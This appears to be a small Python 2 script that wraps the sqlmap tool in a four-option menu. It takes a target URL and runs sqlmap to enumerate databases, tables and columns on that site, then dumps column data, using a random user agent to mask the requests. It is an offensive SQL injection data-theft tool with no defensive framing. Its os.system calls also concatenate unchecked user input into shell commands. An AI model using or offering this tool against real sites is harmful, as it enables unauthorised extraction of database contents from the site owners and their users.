#!/usr/bin/env python
import os
os.system("apt-get install figlet")
os.system("clear")
os.system("figlet DATABASE-R")
print("""
DENEME8 - DATABASE-R

1) uns-link
2) uns-link + db-name
3) uns-link + db-name + t-name
4) uns-link + db-name + t-name +c-name
""")
opno = raw_input("Choose one: ")
if(opno == "1"):
	lnk = raw_input("Link: ")
	os.system("sqlmap -u " +lnk +" --dbs --random-agent")
elif(opno == "2"):
	lnk = raw_input("Link: ")
	db = raw_input("Database: ")
	os.system("sqlmap -u " +lnk +" -D " +db +" --tables --random-agent")
elif(opno == "3"):
	lnk = raw_input("Link: ")
	db = raw_input("Database: ")
	table = raw_input("Table: ")
	os.system("sqlmap -u " +lnk +" -D " +db +" -T " +table + " --columns --random-agent")
elif(opno == "4"):
	lnk = raw_input("Link: ")
	db = raw_input("Database: ")
	table = raw_input("Table: ")
	column = raw_input("Column: ")
	os.system("sqlmap -u " +lnk +" -D " +db +" -T " +table +" -C " +column +" --dump --random-agent")
else:
	print("")